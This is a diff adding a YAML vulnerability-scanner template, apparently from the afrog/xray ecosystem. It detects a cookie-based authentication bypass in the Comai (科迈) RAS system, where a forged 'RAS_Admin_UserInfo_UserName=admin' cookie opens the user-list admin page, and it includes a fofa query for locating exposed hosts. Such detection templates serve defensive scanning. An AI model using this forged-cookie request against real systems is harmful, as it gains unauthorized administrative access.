@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - headers:
+      Cookie: RAS_Admin_UserInfo_UserName=admin
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 退出</A>
+          - 系统登录</A>
+          - 配置管理</A>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/Server/CmxUser.php?pgid=UserList'
+id: maike-ras-cookie-bypass
+info:
+  author: zan8in
+  description: |-
+    科迈 RAS系统 存在Cookie验证越权，当 RAS_Admin_UserInfo_UserName 设置为 admin 时可访问后台
+    fofa: app="科迈-RAS系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 科迈 RAS系统 Cookie验证越权漏洞
+  severity: high
+  tags: maike,ras,cookie-bypass,argus-import
